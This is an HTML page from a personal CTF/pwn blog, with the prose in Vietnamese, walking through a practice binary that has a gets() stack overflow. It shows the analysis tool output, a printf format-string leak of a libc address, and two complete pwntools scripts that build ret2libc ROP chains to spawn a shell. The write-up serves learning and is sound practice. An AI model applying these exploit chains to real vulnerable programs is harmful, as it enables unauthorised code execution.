<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js dark">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>pwn07 - ret2libc vs ROP - Hjn4 Blog</title>


        <!-- Custom HTML head -->
        
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="../../../favicon.svg">
        <link rel="shortcut icon" href="../../../favicon.png">
        <link rel="stylesheet" href="../../../css/variables.css">
        <link rel="stylesheet" href="../../../css/general.css">
        <link rel="stylesheet" href="../../../css/chrome.css">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../highlight.css">
        <link rel="stylesheet" href="../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        <link rel="stylesheet" href="../../../theme/css/additional.css">

    </head>
    <body>
    <div id="body-container">
        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "dark";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('dark')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var html = document.querySelector('html');
            var sidebar = null;
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item affix "><a href="../../../homepage.html">HOME - Huy Na</a></li><li class="chapter-item affix "><li class="part-title">ROP Emporium</li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/ret2win_challenge.html">ret2win - challenge 1</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/split_challenge.html">split - challenge 2</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/callme_challenge.html">callme - challenge 3</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/write4_challenge.html">write4 - challenge 4</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/badchars_challenge.html">badchars - challenge 5</a></li><li class="chapter-item affix "><li class="part-title">Pwnable.tw</li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/start_challenge.html">start</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/orw_challenge.html">orw</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/calc_challenge.html">calc</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/3x17_challenge.html">3x17</a></li><li class="chapter-item affix "><li class="part-title">Pwn_Pico</li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_Pico/herelibc_challenge.html">Here's a libc </a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_Pico/hijacking_challenge.html">hijacking </a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_Pico/fermat_strins_challenge.html">fermat_strings </a></li><li class="chapter-item affix "><li class="part-title">Pwn from blabla</li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_from_blabla/handy_shellcode_challenge.html">handy shellcode</a></li><li class="chapter-item expanded "><a href="../../../blogs/PWN/Pwn_from_blabla/pwn07_challenge.html" class="active">pwn07 - ret2libc vs ROP</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_from_blabla/got_formatstring_challenge.html">GOT overwrite with format string</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_from_blabla/training_brutepie_challenge.html">training - brute pie</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_from_blabla/training_leak_with_read_challenge.html">training - leak with read</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_from_blabla/training_leak_Pie_Canary_challenge.html">training - leak Pie-Canary</a></li><li class="chapter-item affix "><li class="part-title">Assembly</li><li class="chapter-item "><a href="../../../blogs/Assembly/Session_1.html">Session 1</a></li><li class="chapter-item "><a href="../../../blogs/Assembly/Session_2.html">Session 2</a></li><li class="chapter-item affix "><li class="part-title">RE_Pico</li><li class="chapter-item "><a href="../../../blogs/RE_Pico/ARMssembly_0.html">ARMssembly 0</a></li><li class="chapter-item "><a href="../../../blogs/RE_Pico/ARMssembly_1.html">ARMssembly 1</a></li><li class="chapter-item "><a href="../../../blogs/RE_Pico/ARMssembly_2.html">ARMssembly 2</a></li><li class="chapter-item affix "><li class="part-title">Docker</li><li class="chapter-item "><a href="../../../blogs/Docker/tips.html">Some tips for ctf</a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <!-- Track and set sidebar scroll position -->
        <script>
            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
            sidebarScrollbox.addEventListener('click', function(e) {
                if (e.target.tagName === 'A') {
                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
                }
            }, { passive: true });
            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
            sessionStorage.removeItem('sidebar-scroll');
            if (sidebarScrollTop) {
                // preserve sidebar scroll position when navigating via links within sidebar
                sidebarScrollbox.scrollTop = sidebarScrollTop;
            } else {
                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
                var activeSection = document.querySelector('#sidebar .active');
                if (activeSection) {
                    activeSection.scrollIntoView({ block: 'center' });
                }
            }
        </script>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Hjn4 Blog</h1>

                    <div class="right-buttons">

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="pwn07---ret2libc-vs-rop"><a class="header" href="#pwn07---ret2libc-vs-rop">pwn07 - ret2libc vs ROP</a></h1>
<h3 id="file"><a class="header" href="#file">File</a></h3>
<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc$ file something
something: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4558b5c7ea2d782f422eba9789995f071fb1fd07, for GNU/Linux 3.2.0, not stripped

</code></pre>
<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc$ rabin2 -z something
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00002004 0x00402004 16  17   .rodata ascii Say something :
1   0x00002015 0x00402015 10  11   .rodata ascii Hello !!!!

hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc$ r2 something
 -- Move the comments to the right changing their margin with asm.cmt.margin
[0x004010b0]&gt; aaaa
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze imports (af@@@i)
INFO: Analyze all functions arguments/locals (afva@@@F)
INFO: Analyze function calls (aac)
INFO: Analyze len bytes of instructions for references (aar)
INFO: Finding and parsing C++ vtables (avrr)
INFO: Type matching analysis for all functions (aaft)
INFO: Propagate noreturn information (aanr)
INFO: Scanning for strings constructed in code (/azs)
INFO: Finding function preludes (aap)
INFO: Enable anal.types.constraint for experimental type propagation
[0x004010b0]&gt; afl
0x00401070    1     11 sym.imp.puts
0x00401080    1     11 sym.imp.printf
0x00401090    1     11 sym.imp.gets
0x004010a0    1     11 sym.imp.setvbuf
0x004010b0    1     46 entry0
0x004010f0    4     31 sym.deregister_tm_clones
0x00401120    4     49 sym.register_tm_clones
0x00401160    3     32 sym.__do_global_dtors_aux
0x00401190    1      6 sym.frame_dummy
0x004012b0    1      5 sym.__libc_csu_fini
0x004011dd    1     49 sym.vuln
0x004012b8    1     13 sym._fini
0x00401240    4    101 sym.__libc_csu_init
0x004010e0    1      5 sym._dl_relocate_static_pie
0x0040120e    1     37 main
0x00401000    3     27 sym._init
0x00401196    1     71 sym.setup
0x00401030    2     28 fcn.00401030
0x00401040    1     15 fcn.00401040
0x00401050    1     15 fcn.00401050
0x00401060    1     15 fcn.00401060

</code></pre>
<h3 id="checksec"><a class="header" href="#checksec">Checksec</a></h3>
<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc$ checksec something
[*] '/mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc/something'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

</code></pre>
<h3 id="main-func"><a class="header" href="#main-func">Main func</a></h3>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  puts(&quot;Hello !!!!&quot;);
  vuln();
  return 0;
}
</code></pre>
<h3 id="vuln-func"><a class="header" href="#vuln-func">Vuln func</a></h3>
<pre><code class="language-c">__int64 vuln()
{
  char v1[32]; // [rsp+0h] [rbp-20h] BYREF

  printf(&quot;Say something : &quot;);
  return gets(v1);
}

</code></pre>
<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc$ ./something
Hello !!!!
Say something : abc
</code></pre>
<p>Thì ở đây ta có thể thấy flow chương trình khá là đơn giản, ta có thể lợi dụng BOF với <em>gets</em>. Tuy nhiên ta cần biết phải return, control flow chương trình như nào. Ta hướng đến ret2libc</p>
<p>Do đó ta cần leak được địa chỉ hàm cụ thể =&gt; libc base. Nên ta sẽ lợi dụng hàm <em>prinf</em> để format string nhầm leak ra địa chỉ trên hàm trên binary.</p>
<p>Oke, giờ thì ta hướng đến việc ghi chuỗi format string <em>&quot;%p %p %p %p&quot;</em> vào đâu và how, oke ta sẽ ghi vào với <em>gets</em> và tại ô nhớ có thể ghi được, check bằng <strong>vmmap</strong>. Sau đấy sẽ dùng <em>printf</em> để format string. </p>
<p>Ta cần thêm vài gadgets cho việc đó như là <strong>pop rdi ; ret</strong> và <strong>ret</strong></p>
<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc$ ROPgadget --binary something | grep &quot;pop rdi
; ret&quot;
0x00000000004012a3 : pop rdi ; ret
----------------------------------------------
0x000000000040101a : ret
</code></pre>
<p>Cần địa chỉ của hàm <em>printf</em>, <em>gets</em>, và <em>địa chỉ</em> lưu chuỗi <strong>&quot;%p %p %p %p&quot;</strong></p>
<pre><code class="language-python">pwndbg&gt; disass vuln
Dump of assembler code for function vuln:
   0x00000000004011dd &lt;+0&gt;:     endbr64
   0x00000000004011e1 &lt;+4&gt;:     push   rbp
   0x00000000004011e2 &lt;+5&gt;:     mov    rbp,rsp
   0x00000000004011e5 &lt;+8&gt;:     sub    rsp,0x20
   0x00000000004011e9 &lt;+12&gt;:    lea    rdi,[rip+0xe14]        # 0x402004
   0x00000000004011f0 &lt;+19&gt;:    mov    eax,0x0
   0x00000000004011f5 &lt;+24&gt;:    call   0x401080 &lt;printf@plt&gt;
   0x00000000004011fa &lt;+29&gt;:    lea    rax,[rbp-0x20]
   0x00000000004011fe &lt;+33&gt;:    mov    rdi,rax
   0x0000000000401201 &lt;+36&gt;:    mov    eax,0x0
   0x0000000000401206 &lt;+41&gt;:    call   0x401090 &lt;gets@plt&gt;
   0x000000000040120b &lt;+46&gt;:    nop
   0x000000000040120c &lt;+47&gt;:    leave
   0x000000000040120d &lt;+48&gt;:    ret

</code></pre>
<pre><code class="language-python">pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
          0x400000           0x401000 r--p     1000      0 /mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc/something
          0x401000           0x402000 r-xp     1000   1000 /mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc/something
          0x402000           0x403000 r--p     1000   2000 /mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc/something
          0x403000           0x404000 r--p     1000   2000 /mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc/something
          0x404000           0x405000 rw-p     1000   3000 /mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc/something
    0x7ffff7d8b000     0x7ffff7d8e000 rw-p     3000      0 [anon_7ffff7d8b]
    0x7ffff7d8e000     0x7ffff7db6000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7db6000     0x7ffff7f4b000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7f4b000     0x7ffff7fa3000 r--p    58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7fa3000     0x7ffff7fa7000 r--p     4000 214000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7fa7000     0x7ffff7fa9000 rw-p     2000 218000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7fa9000     0x7ffff7fb6000 rw-p     d000      0 [anon_7ffff7fa9]
    0x7ffff7fbc000     0x7ffff7fbe000 rw-p     2000      0 [anon_7ffff7fbc]
    0x7ffff7fbe000     0x7ffff7fc2000 r--p     4000      0 [vvar]
    0x7ffff7fc2000     0x7ffff7fc3000 r-xp     1000      0 [vdso]
    0x7ffff7fc3000     0x7ffff7fc5000 r--p     2000      0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fc5000     0x7ffff7fef000 r-xp    2a000   2000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fef000     0x7ffff7ffa000 r--p     b000  2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  39000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]

</code></pre>
<p>ta cần ghi vào ô nhớ trống tránh việc ghi đè lên vùng nhớ đã chứa gữ liệu.</p>
<p>ta có thể check được điều đó với <em><strong>pwndbg&gt; x/100s 0x404000</strong></em>. ở đây mình chọn <strong>0x404070</strong></p>
<p>Cần tính số byte để overflow đến return address, này đặt breakpoints và tính: </p>
<pre><code class="language-python">&gt;&gt;&gt; str = 0x7fffffffe000
&gt;&gt;&gt; ret = 0x7fffffffe028
&gt;&gt;&gt; ret - str
40

</code></pre>
<h3 id="leak-func"><a class="header" href="#leak-func">leak func</a></h3>
<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc$ python3 exploit.py
[+] Starting local process './something': pid 641
[*] running in new terminal: ['/usr/bin/gdb', '-q', './som[+] Starting local process './something': pid 641
[*] running in new terminal: ['/usr/bin/gdb', '-q', './something', '641', '-x', '/tmp/pwn2t5eqodz.gdb']
[-] Waiting for debugger: debugger exited! (maybe check /proc/sys/kernel/yama/ptrace_scope)
b'Hello !!!!\nSay something : '
[*] Switching to interactive mode
$ %p %p %p %p
0x1 0x1 0x7fb5af242aa0 (nil)Say something : $

</code></pre>
<pre><code class="language-shell">pwndbg&gt; x/s 0x7fb5af242aa0
0x7fb5af242aa0 &lt;_IO_2_1_stdin_&gt;:        &quot;\213 \255&quot;, &lt;incomplete sequence \373&gt;
</code></pre>
<p>vậy ta nhận thấy là ở format string thứ 3 tức <strong>%3$p</strong> thì có được địa chỉ của hàm <em><strong><em>IO_2_1_stdin</em></strong></em></p>
<p>Tiếp theo muốn tính được <em>libc base</em> ta cần có offset của hàm <em><strong><em>IO_2_1_stdin</em></strong></em>. How?</p>
<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc$ readelf -sW /usr/lib/x86_64-linux-gnu/libc.so.6 | grep &quot;_IO_2_1_stdin_&quot;
  2298: 0000000000219aa0   224 OBJECT  GLOBAL DEFAULT   34 _IO_2_1_stdin_@@GLIBC_2.2.5
</code></pre>
<p>Sau khi có được offset =&gt; tiến hành tính <em>libc_base</em></p>
<p>Có <em>libc_base</em> ta cần thêm offset của <em>system</em> và <em>/bin/sh</em> để lấy shell</p>
<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc$ readelf -sW /usr/lib/x86_64-linux-gnu/libc.so.6 | grep &quot;system&quot;
   396: 0000000000050d60    45 FUNC    GLOBAL DEFAULT   15 __libc_system@@GLIBC_PRIVATE
  1481: 0000000000050d60    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
  2759: 0000000000169140   103 FUNC    GLOBAL DEFAULT   15 svcerr_systemerr@GLIBC_2.2.5

</code></pre>
<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc$ strings -tx /usr/lib/x86_64-linux-gnu/libc.so.6 | grep &quot;/bin/sh&quot;
 1d8698 /bin/sh

</code></pre>
<blockquote>
<h4 id="ta-có-thể-sử-dụng-onegadget-nếu-thỏa-các-registers"><a class="header" href="#ta-có-thể-sử-dụng-onegadget-nếu-thỏa-các-registers">Ta có thể sử dụng Onegadget nếu thỏa các registers</a></h4>
</blockquote>
<h2 id="exploit-1"><a class="header" href="#exploit-1">Exploit 1</a></h2>
<pre><code class="language-python">from pwn import *

r = process(&quot;./something&quot;)
gdb.attach(r, api= True)

print(r.recvuntil(b&quot;something : &quot;))

gets = 0x401090
printf = 0x401080
pop_rdi_ret = 0x00000000004012a3
format_string = 0x404500
ret_gadget = 0x000000000040101a
stdin_func_offset_of_libc = 0x0000000000219aa0
vuln_func_address = 0x00000000004011dd
system_func_offset = 0x0000000000050d60
binsh_string_offset = 0x1d8698

payload = b&quot;A&quot;*40 + p64(ret_gadget) +p64(pop_rdi_ret) + p64(format_string) +p64(gets)
payload += p64(ret_gadget) + p64(pop_rdi_ret) + p64(format_string) +p64(printf)
payload += p64(ret_gadget) + p64(vuln_func_address)
r.sendline(payload)

payload = b&quot;%3$p&quot;
r.sendline(payload)

output = r.recvuntil(b&quot;something : &quot;)
print(output)
stdin_address = int(output.split(b&quot;Say&quot;)[0],16)

libc_base = stdin_address - stdin_func_offset_of_libc
print(hex(libc_base))

system_address = libc_base + system_func_offset
binsh_string_address =libc_base + binsh_string_offset

payload = b&quot;A&quot;*40 + p64(ret_gadget) + p64(pop_rdi_ret) + p64(binsh_string_address) +p64(system_address)

r.sendline(payload)

r.interactive()

</code></pre>
<h2 id="exploit-2"><a class="header" href="#exploit-2">Exploit 2</a></h2>
<pre><code class="language-python">from pwn import *

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
bianry = ELF('./something')

rop= ROP(bianry)
r = process(bianry.path)
gdb.attach(r, api = True)

junk = b'a'*40
printf_add = 0x401080
gets_add = 0x401090
vuln_add = 0x00000000004011dd
add_store_string = 0x404070
pop_rdi_ret = rop.find_gadget(['pop rdi','ret'])[0]
ret = rop.find_gadget(['ret'])[0]


print(r.recvuntil(b'something : '))

payload1 = junk + p64(ret) + p64(pop_rdi_ret) + p64(add_store_string)  + p64(gets_add)
payload1 += p64(ret) + p64(pop_rdi_ret) + p64(add_store_string)  + p64(printf_add)
payload1 += p64(ret) + p64(vuln_add)

r.sendline(payload1)

payload2 = b&quot;%3$p&quot;
r.sendline(payload2)
output = r.recvuntil(b&quot;something : &quot;)

stdin = int(output.split(b&quot;Say&quot;)[0],16)
leak_stdin_offset = libc.symbols['_IO_2_1_stdin_']
libc_base = stdin - leak_stdin_offset

system_offset = libc.symbols['system']
binsh_offset = next(libc.search(b'/bin/sh\x00'))

system_add = libc_base + system_offset
binsh_add = libc_base + binsh_offset

payload3 = junk + p64(ret) + p64(pop_rdi_ret) + p64(binsh_add) + p64(system_add)
r.sendline(payload3)
r.interactive()

</code></pre>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../blogs/PWN/Pwn_from_blabla/handy_shellcode_challenge.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next" href="../../../blogs/PWN/Pwn_from_blabla/got_formatstring_challenge.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../blogs/PWN/Pwn_from_blabla/handy_shellcode_challenge.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next" href="../../../blogs/PWN/Pwn_from_blabla/got_formatstring_challenge.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../elasticlunr.min.js"></script>
        <script src="../../../mark.min.js"></script>
        <script src="../../../searcher.js"></script>

        <script src="../../../clipboard.min.js"></script>
        <script src="../../../highlight.js"></script>
        <script src="../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
